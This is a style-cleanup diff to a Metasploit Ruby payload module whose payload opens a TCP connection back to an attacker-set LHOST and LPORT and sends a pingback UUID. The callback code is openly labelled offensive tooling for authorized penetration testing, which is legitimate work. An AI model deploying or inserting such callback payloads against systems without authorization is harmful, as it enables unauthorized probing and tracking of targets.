@@ -25,32 +25,26 @@ module MetasploitModule
       'PayloadType' => 'ruby',
       'Payload' =>
         {
-          'Offsets' => { },
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+    ))
   end
 
   def generate
-    #return prepends(ruby_string)
+    # return prepends(ruby_string)
     return ruby_string
   end
 
   def ruby_string
-    self.pingback_uuid ||= self.generate_pingback_uuid
+    self.pingback_uuid ||= generate_pingback_uuid
 
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 
-    return "require 'socket';"+
-      "c=TCPSocket.new(\"#{lhost}\", #{datastore['LPORT'].to_i});"+
-      "c.puts(\'#{self.pingback_uuid.gsub('-','')}\'.scan(/../).map { |x| x.hex.chr }.join);"+
+    return "require 'socket';" \
+      "c=TCPSocket.new(\"#{lhost}\", #{datastore['LPORT'].to_i});" \
+      "c.puts(\'#{self.pingback_uuid.gsub('-', '')}\'.scan(/../).map { |x| x.hex.chr }.join);" \
       "c.close"
- end
-
-  def include_send_pingback
-    true
   end
 end
-
-
